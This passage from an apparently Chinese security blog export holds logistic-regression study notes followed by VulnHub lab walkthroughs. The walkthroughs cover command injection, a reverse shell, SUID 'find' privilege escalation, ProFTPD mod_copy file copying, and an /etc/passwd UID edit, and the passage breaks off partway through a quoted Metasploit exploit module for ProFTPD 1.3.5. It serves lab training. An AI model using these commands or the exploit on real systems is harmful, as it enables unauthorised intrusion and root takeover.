    <url>/Machine_learning/basic_learning/3.Machine-Learning-Week3/</url>
    <content><![CDATA[<blockquote>
<p>这一篇主要总结逻辑回归相关知识点</p>
</blockquote>
<h1 id="Machine-Learning-Week3">Machine Learning Week3</h1>
<h2 id="0x01-假设表示-Hypothesis-Representation">0x01 假设表示(Hypothesis Representation)</h2>
<p>逻辑回归算法的假设函数 hθ(x) 由以下表达式组成：<br>
$$<br>
\begin{align*}&amp; h_\theta (x) = g ( \theta^T x ) \newline \newline&amp; z = \theta^T x \newline&amp; g(z) = \dfrac{1}{1 + e^{-z}}\end{align*}<br>
$$<br>
其中g(z) 称为<strong>逻辑函数（Logistic Function）</strong>，又称为 <strong>Sigmoid Function</strong>。</p>
<p>该函数的图像为：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200409103736.png" alt=""></p>
<p>hθ(x) 的作用是，对于给定的输入变量，根据选择的参数计算输出变量=1的可能性，即hθ(x) = P(y=0|x;θ) ，例如，如果对于给定的x，通过已经确定的参数计算得出hθ(x) = 0.7，则表示有70%的几率y为正向类，相应地为负向类的几率为1-0.7=0.3。</p>
<h2 id="0x02-判定边界-Decision-Boundary">0x02 判定边界(Decision Boundary)</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200409104311.png" alt=""></p>
<p>在逻辑回归中，我们预测：</p>
<p>当 hθ(x) &gt;= 0.5时，预测y=1;</p>
<p>当 hθ(x) &lt; 0.5时，预测y=0;</p>
<p>根据S形函数图像，当</p>
<p>z = 0时，g(z) = 0.5;</p>
<p>z &gt; 0时，g(z) &gt; 0.5;</p>
<p>z &lt; 0时，g(z) &lt; 0.5;</p>
<p>又z = θ<sup>T</sup>x，即 θ<sup>T</sup>x &gt;= 0时，预测y=1， θ<sup>T</sup>x &lt; 0时，预测y=0</p>
<p>现在假设我们有一个模型：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200409110112.png" alt=""></p>
<p>并且参数θ是向量[-3 1 1]。 则当-3 + x1 + x2 &gt;= 0，即x1 + x2 &gt;= 3时，模型将预测 y = 1 。 我们可以绘制直线x1 + x2 = 3，这条线便是我们模型的分界线，将预测为1的区域和预测为 0的区域分隔开。</p>
<p>也就是说，z = θ<sup>T</sup>x在几何角度中就是判定边界的函数。决策边界只与参数 θ 有关。</p>
<h2 id="0x03-代价函数-Cost-Function">0x03 代价函数(Cost Function)</h2>
<p>公式表示：<br>
$$<br>
\begin{align*}&amp; J(\theta) = \dfrac{1}{m} \sum_{i=1}^m \mathrm{Cost}(h_\theta(x<sup>{(i)}),y</sup>{(i)}) \newline &amp; \mathrm{Cost}(h_\theta(x),y) = -\log(h_\theta(x)) ; &amp; \text{if y = 1} \newline &amp; \mathrm{Cost}(h_\theta(x),y) = -\log(1-h_\theta(x)) ; &amp; \text{if y = 0}\end{align*}<br>
$$<br>
几何意义：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200409110525.png" alt=""></p>
<p>这样构建的Cost(hθ(x), y)函数的特点是：当实际的y =1且 hθ(x) 也为1 时误差为 0，当 y = 1但hθ(x)不为1时误差随着hθ(x)变小而变大；当实际的y = 0且hθ(x)也为 0 时代价为 0，当y = 0但hθ(x)不为0时，误差随着hθ(x)的变大而变大。</p>
<p>进一步整理一下：<br>
$$<br>
\mathrm{Cost}(h_\theta(x),y) = - y ; \log(h_\theta(x)) - (1 - y) \log(1 - h_\theta(x))<br>
$$<br>
带入：<br>
$$<br>
J(\theta) = \dfrac{1}{m} \sum_{i=1}^m - y^{(i)} ; \log(h_\theta(x^{(i)})) - (1 - y^{(i)}) \log(1 - h_\theta(x^{(i)}))<br>
$$<br>
向量化：<br>
$$<br>
\begin{align*} &amp; h = g(X\theta)\newline &amp; J(\theta) = \frac{1}{m} \cdot \left(-y<sup>{T}\log(h)-(1-y)</sup>{T}\log(1-h)\right) \end{align*}<br>
$$</p>
<h2 id="0x04-梯度下降-Gradient-Descent">0x04 梯度下降(Gradient Descent)</h2>
<p>梯度下降的一般形式：<br>
$$<br>
\begin{align*}&amp; Repeat ; \lbrace \newline &amp; ; \theta_j := \theta_j - \alpha \dfrac{\partial}{\partial \theta_j}J(\theta) \newline &amp; \rbrace\end{align*}<br>
$$<br>
代入J(θ)：<br>
$$<br>
\begin{align*} &amp; Repeat ; \lbrace \newline &amp; ; \theta_j := \theta_j - \frac{\alpha}{m} \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)}) x_j^{(i)} \newline &amp; \rbrace \end{align*}<br>
$$<br>
可以发现，逻辑回归的梯度下降和线性回归的梯度下降在形式上是完全相同的，但是假设函数hθ(x)发生了变化。</p>
<p>向量化：<br>
$$<br>
\theta := \theta - \frac{\alpha}{m}X^T(g(X\theta) - \vec y)<br>
$$</p>
<h2 id="0x05-多分类-Muti-classification">0x05 多分类(Muti-classification)</h2>
<p>处理多分类问题的本质就是转化为二分类问题，现在假设有三个类别：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200410110259.png" alt=""></p>
<p>用三角形表示y = 1 ，方框表示y = 2，叉叉表示y = 3 。我们下面要做的就是使用一个训练集，将其分成3个二元分类问题</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200410110338.png" alt=""></p>
<p>为了能实现这样的转变，我们将多个类中的一个类标记为正向类（y = 1），然后将其他所有类都标记为负向类，这个模型记作h<sub>θ</sub><sup>(1)</sup> (x)。接着，类似地第我们选择另一个类标记为正向类（y = 2），再将其它类都标记为负向类，将这个模型记作 h<sub>θ</sub><sup>(2)</sup> (x)，依此类推。最后，为了做出预测，我们给出输入一个新的x值，用这个做预测。我们要做的就是在我们三个分类器里面输入x ，然后我们选择一个让 h<sub>θ</sub><sup>(i)</sup> (x)最大的i，即：<br>
$$<br>
\arg\max_\theta h_{\theta}^{(i)}<br>
$$</p>
<h2 id="0x06-正则化-Regularization">0x06 正则化(Regularization)</h2>
<p>所谓正则化，就是为了防止出现过拟合而对某些θ参数引入惩罚因子，这样做的话，我们在尝试最小化代价时也需要将这个惩罚纳入考虑中，并最终导致选择较小一些的θ。</p>
<p>比如回归问题中如果我们的假设函数是：<br>
$$<br>
h_\theta (x) = \theta_0 + \theta_1 x_1 + \theta_2 x_2^2 + \theta_3 x_3^3 + \theta_4 x_4^4<br>
$$<br>
我们想对θ3和θ4设置一点惩罚，修改后的代价函数为：<br>
$$<br>
min_\theta \frac{1}{2m}[\sum_{i=1}<sup>{m}(h_\theta(x</sup>{(i)})-y<sup>{(i)})</sup>2 + 1000\theta_3^2 + 1000\theta_4^2]<br>
$$<br>
假如我们有非常多的特征，我们并不知道其中哪些特征我们要惩罚，我们将对所有的特征进行惩罚，并且让代价函数最优化的软件来选择这些惩罚的程度。这样的结果是得到了一个较为简单的能防止过拟合问题的假设：<br>
$$<br>
min_\theta \frac{1}{2m}[\sum_{i=1}<sup>{m}(h_\theta(x</sup>{(i)})-y<sup>{(i)})</sup>2 + \lambda\sum_{i=1}<sup>m\theta_j</sup>2]<br>
$$<br>
其中λ又称为正则化参数（Regularization Parameter）。</p>
<h3 id="正则化线性回归">正则化线性回归</h3>
<p>$$<br>
\begin{align*} &amp; \text{Repeat}\ \lbrace \newline &amp; \ \ \ \ \theta_0 := \theta_0 - \alpha\ \frac{1}{m}\ \sum_{i=1}^m (h_\theta(x^{(i)}) - y<sup>{(i)})x_0</sup>{(i)} \newline &amp; \ \ \ \ \theta_j := \theta_j - \alpha\ \left[ \left( \frac{1}{m}\ \sum_{i=1}^m (h_\theta(x^{(i)}) - y<sup>{(i)})x_j</sup>{(i)} \right) + \frac{\lambda}{m}\theta_j \right] &amp;\ \ \ \ \ \ \ \ \ \ j \in \lbrace 1,2…n\rbrace\newline &amp; \rbrace \end{align*}<br>
$$</p>
<p>正规方程求解正则化线性回归<br>
$$<br>
\begin{align*}&amp; \theta = \left( X^TX + \lambda \cdot L \right)^{-1} X^Ty \newline&amp; \text{where}\ \ L = \begin{bmatrix} 0 &amp; &amp; &amp; &amp; \newline &amp; 1 &amp; &amp; &amp; \newline &amp; &amp; 1 &amp; &amp; \newline &amp; &amp; &amp; \ddots &amp; \newline &amp; &amp; &amp; &amp; 1 \newline\end{bmatrix}\end{align*}<br>
$$</p>
<h3 id="正则化逻辑回归">正则化逻辑回归</h3>
<p>同样对于逻辑回归，我们也给代价函数增加一个正则化的表达式，得到代价函数：<br>
$$<br>
J(\theta) = -\dfrac{1}{m} \sum_{i=1}^m  [y^{(i)} ; \log(h_\theta(x^{(i)})) + (1 - y^{(i)}) \log(1 - h_\theta(x^{(i)}))] + \frac{\lambda}{2m}\sum_{j=1}^n \theta_j^2<br>
$$</p>
]]></content>
      <categories>
        <category>机器学习</category>
        <category>基础入门</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>逻辑回归</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub::BossplayersCTF-walkthrough</title>
    <url>/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough/</url>
    <content><![CDATA[<h1 id="VulnHub-BossplayersCTF-Walkthrough">VulnHub::BossplayersCTF Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p>Aimed at Beginner Security Professionals who want to get their feet wet into doing some CTF’s. It should take around 30 minutes to root.</p>
<p>FROM: <a href="https://www.vulnhub.com/entry/bossplayersctf-1,375/">https://www.vulnhub.com/entry/bossplayersctf-1,375/</a></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>netdiscover</li>
<li>nmap</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>netdiscover扫描内网段：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215121221.png" alt=""></p>
<p>靶机IP地址192.168.0.104，nmap查看开放端口：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215121423.png" alt=""></p>
<p>80端口上运行着Apache2.3.48，dirsearch和gobuster扫描网站目录：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215122359.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215151339.png" alt=""></p>
<p>logs.php和robots.txt都没有什么可以利用的地方，index.html查看源代码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215151531.png" alt=""></p>
<p>三次base64解码得到一个后台网页：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215151722.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215151816.png" alt=""></p>
<p>提示我们可能存在命令执行漏洞，尝试一下<code>?cmd=pwd</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215151935.png" alt=""></p>
<p>成功得到回显，再反弹shell，本地监听4444端口：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215153053.png" alt=""></p>
<p>再返回标准shell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215153130.png" alt=""></p>
<p><a href="http://xn--LinEnum-4t3kgdr76xkzh4h9481a4gub.sh">跑一下提权脚本LinEnum.sh</a>，注意到find命令是以root身份执行的：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215153907.png" alt=""></p>
<p>在GTFObins上查找一下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215154524.png" alt=""></p>
<p>根据提示执行<code>find . -exec /bin/sh -p \; -quit</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215154832.png" alt=""></p>
<p>成功获取root权限。</p>
<h2 id="0x04-Reference">0x04 Reference</h2>
<p><a href="https://blog.csdn.net/weixin_44214107/article/details/102493939">https://blog.csdn.net/weixin_44214107/article/details/102493939</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub::DC-1-walkthrough</title>
    <url>/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough/</url>
    <content><![CDATA[<h1 id="VulnHub-DC-1-Walkthrough">VulnHub::DC-1 Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>
<p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p>
<p>To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p>
<p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</p>
<p>There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges.</p>
<p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p>
<p>Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>JohnTheRipper</li>
<li>Drupal Geddon 2 Forms API Property  Injection</li>
<li>Drupal Geddon SQL Injection (Add admin user)</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>查找靶机IP：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218115253.png" alt=""></p>
<p>查找靶机端口和服务：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218115157.png" alt=""></p>
<p>从drupal 7下手，在metasploit中查看相关漏洞：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218120059.png" alt=""></p>
<p>发现<code>drupal_drupalgeddon2</code>可以成功exploit，进行相关配置：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218120416.png" alt=""></p>
<p>使用Python命令获取正常tty，获得第一个flag1.txt：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218120549.png" alt=""></p>
<p>提示我们去找配置文件，Google一下drupal站点的配置文件目录：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218121857.png" alt=""></p>
<p>不仅得到flag2的内容，还有MySQL数据库的连接用户和密码，尝试登录：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218154149.png" alt=""></p>
<p>查询用户表的账号和密码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218155218.png" alt=""></p>
<p>用JohnTheRipper爆破密码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218173459.png" alt=""></p>
<p>使用Fred账号登录后台，没有flag或hint，尝试获取后台管理员权限，用<code>searchexploit</code>查找相关利用：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219110620.png" alt=""></p>
<p>根据提示新增一个管理员用户：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219111305.png" alt=""></p>
<p>在数据库中查询发现成功插入：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219111533.png" alt=""></p>
<p>登录后台系统，在<code>contents</code>中获得flag3：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219111639.png" alt=""></p>
<p>看一下flag3，要我们去查看shadow文件，看到perm猜测是不是suid提权：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219113204.png" alt=""></p>
<p>find命令可以用来提权：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219114728.png" alt=""></p>
<p>输入<code>find . -exec /bin/sh \; -quit</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219114859.png" alt=""></p>
<p>有一个flag4的用户，进入主目录发现flag4.txt：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219115024.png" alt=""></p>
<p>进入root主目录，发现最后一个flag：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219115302.png" alt=""></p>
<h2 id="0x04-Extra">0x04 Extra</h2>
<p>根据flag3的提示，期望的做法应该是用find命令查询：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219150714.png" alt=""></p>
<blockquote>
<p>命令解释：<a href="https://blog.csdn.net/u010900754/article/details/83020378?utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/u010900754/article/details/83020378?utm_source=distribute.pc_relevant.none-task</a></p>
</blockquote>
<p>拿到密码的sha256，试试能不能爆破密码出来：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219170946.png" alt=""></p>
<p>ssh登录成功：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219171038.png" alt=""></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub::DigitalWorld.Local:JOY Walkthrough</title>
    <url>/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough/</url>
    <content><![CDATA[<h1 id="VulnHub-DigitalWorld-Local-JOY-Walkthrough">VulnHub::DigitalWorld.Local:JOY Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p>Does penetration testing spark joy? If it does, this machine is for you.</p>
<p>This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this.</p>
<p>This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder. 😃</p>
<p>If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Joy is (#1): <a href="https://www.youtube.com/watch?v=9AvWs2X-bEA">https://www.youtube.com/watch?v=9AvWs2X-bEA</a>, (#2): something that should be replicated, (#3): what happens when you clean out seemingly “hidden” closets.</p>
<p>Note: There are at least two reliable ways of obtaining user privileges and rooting this machine. Have fun. 😃</p>
<p>Feel free to contact the author at <a href="https://donavan.sg/blog">https://donavan.sg/blog</a> if you would like to drop a comment.</p>
<p>Download Link：<a href="https://www.vulnhub.com/entry/digitalworldlocal-joy,298/">https://www.vulnhub.com/entry/digitalworldlocal-joy,298/</a></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<p><strong>Scanning</strong></p>
<ul>
<li>Nmap</li>
</ul>
<p><strong>Enumeration</strong></p>
<ul>
<li>FTP anonymous login</li>
</ul>
<p><strong>Exploit</strong></p>
<ul>
<li>Exploit proftpd using Metasploit</li>
</ul>
<p><strong>Privilege Escalation</strong></p>
<ul>
<li>Sudo right</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>扫描网段，发现靶机IP地址<code>192.168.0.108</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227133714.png" alt=""></p>
<p>扫描靶机端口：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227143203.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227143240.png" alt=""></p>
<p>发现FTP是可以匿名登录的，直接使用FileZilla工具登录站点查看文件</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227160828.png" alt=""></p>
<p>一路看下来发现directory文件列出了<code>/home/patrick</code>目录下的所有文件，剔除一些常见的和随机生成的文件之外，就剩下<code>verison_control</code>值得看一看，用下面的命令把文件复制到FTP站点目录：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227161330.png" alt=""></p>
<blockquote>
<p>telnet和ftp命令的区别：</p>
<p>telnet连接后，用户主机实际成为远程TELNET服务器的一个虚拟终端（或称是哑终端），一切服务完全在远程服务器上执行，但用户决不能从远程服务器中下载或上传文件，或拷贝文件到用户主机中来。</p>
<p>ftp则不同，它是采用客户机/服务器模式，用户能够操作FTP服务器中的目录，上传或下载文件，但用户不能请求服务器执行某个文件。</p>
</blockquote>
<p><code>version_control</code>文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Version Control of External-Facing Services:</span><br><span class="line"></span><br><span class="line">Apache: 2.4.25</span><br><span class="line">Dropbear SSH: 0.34</span><br><span class="line">ProFTPd: 1.3.5</span><br><span class="line">Samba: 4.5.12</span><br><span class="line"></span><br><span class="line">We should switch to OpenSSH and upgrade ProFTPd.</span><br><span class="line"></span><br><span class="line">Note that we have some other configurations in this machine.</span><br><span class="line">1. The webroot is no longer &#x2F;var&#x2F;www&#x2F;html. We have changed it to &#x2F;var&#x2F;www&#x2F;tryingharderisjoy.</span><br><span class="line">2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.</span><br></pre></td></tr></table></figure>
<p>提示我们<code>ProFTP</code>需要升级，我们先从这入手：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227161634.png" alt=""></p>
<p>直接上Metasploit：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227161932.png" alt=""></p>
<p>返回一个标准Shell：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227162733.png" alt=""></p>
<p>查看当前目录下有哪些文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227165542.png" alt=""></p>
<p>有一个<code>L37ISF8.php</code>文件是刚刚exp生成的，接着看ossec目录：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227165716.png" alt=""></p>
<p>有一个比较可疑的文件<code>patricksecretsofjoy</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227165805.png" alt=""></p>
<p>有patrick用户的登录密码，root的密码算是作者的恶搞吧。直接登录patrick用户，尝试提权：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228164812.png" alt=""></p>
<p>到这里就有两种思路用来提权：</p>
<ol>
<li>
<p>利用<code>/home/patrick/script/test</code>的脚本文件来更改<code>/etc/passwd</code>的权限，进而修改patrick用户的权限；</p>
</li>
<li>
<p>上传自己编写的脚本至相同的目录。这里就文字叙述一下具体过程：</p>
<p>a) 首先在本机上编写Shell脚本<code>echo &quot;awk 'BEGIN &#123;system(\&quot;/bin/bash\&quot;)&#125;'&quot; &gt; test</code>；</p>
<p>b) 再使用ftp上传到<code>upload</code>目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 192.168.0.108</span><br><span class="line">cd upload</span><br><span class="line">put test</span><br></pre></td></tr></table></figure>
<p>c) 再使用telnet传入到<code>/home/patrick/script</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.0.108 21</span><br><span class="line">site cpfr &#x2F;home&#x2F;ftp&#x2F;upload&#x2F;test</span><br><span class="line">site cpto &#x2F;home&#x2F;patrick&#x2F;script&#x2F;test</span><br></pre></td></tr></table></figure>
<p>d) 再执行<code>test</code>文件<code>sudo /home/patrick/script/test</code></p>
</li>
</ol>
<p>相对而言第一个思路会比较简单，修改权限：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228192822.png" alt=""></p>
<p>修改Patrick用户的uid和gid：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228213715.png" alt=""></p>
<blockquote>
<p>这里可以直接登录靶机用nano修改，但是如何在主机上的反弹shell修改呢？因为反弹shell不支持vim, vi, nano等交互式窗口，但是别忘了还有一个<code>sed</code>命令可以用来编辑文件，<code>sed '36,36s/1000:1000/0:0/g' /etc/passwd</code>，上面这个命令表示修改<code>/etc/passwd</code>文件中的第36行，把<code>1000:1000</code>替换成<code>0:0</code></p>
</blockquote>
<p>重新登录一下就可以获得root权限了：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228214224.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228214233.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228214248.png" alt=""></p>
<h2 id="0x04-ProFTP-1-3-5-exp">0x04 ProFTP 1.3.5 exp</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: http://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"></span><br><span class="line">class Metasploit3 &lt; Msf::Exploit::Remote</span><br><span class="line"></span><br><span class="line">  Rank = ExcellentRanking</span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Remote::Tcp</span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Remote::HttpClient</span><br><span class="line"></span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&#x27;ProFTPD 1.3.5 Mod_Copy Command Execution&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; %q&#123;</span><br><span class="line">          This module exploits the SITE CPFR/CPTO commands in ProFTPD version <span class="number">1.3</span><span class="number">.5</span>.</span><br><span class="line">          Any unauthenticated client can leverage these commands to copy files <span class="keyword">from</span> any</span><br><span class="line">          part of the filesystem to a chosen destination. The copy commands are executed with</span><br><span class="line">          the rights of the ProFTPD service, which by <span class="keyword">default</span> runs under the privileges of the</span><br><span class="line">          <span class="string">&#x27;nobody&#x27;</span> user. By using /proc/<span class="built_in">self</span>/cmdline to copy a PHP payload to the website</span><br><span class="line">          <span class="built_in">directory</span>, PHP remote code execution is made possible.</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="string">&#x27;Vadim Melihow&#x27;</span>, <span class="comment"># Original discovery, Proof of Concept</span></span><br><span class="line">          <span class="string">&#x27;xistence &lt;xistence[at]0x90.nl&gt;&#x27;</span> <span class="comment"># Metasploit module</span></span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span>        =&gt; MSF_LICENSE,</span><br><span class="line">      <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ <span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2015-3306&#x27;</span> ],</span><br><span class="line">          [ <span class="string">&#x27;EDB&#x27;</span>, <span class="string">&#x27;36742&#x27;</span> ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>       =&gt; [ <span class="string">&#x27;unix&#x27;</span> ],</span><br><span class="line">      <span class="string">&#x27;Arch&#x27;</span>           =&gt; ARCH_CMD,</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span>        =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;Compat&#x27;</span>      =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">&#x27;PayloadType&#x27;</span> =&gt; <span class="string">&#x27;cmd&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;RequiredCmd&#x27;</span> =&gt; <span class="string">&#x27;generic gawk bash python perl&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ <span class="string">&#x27;ProFTPD 1.3.5&#x27;</span>, &#123; &#125; ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span 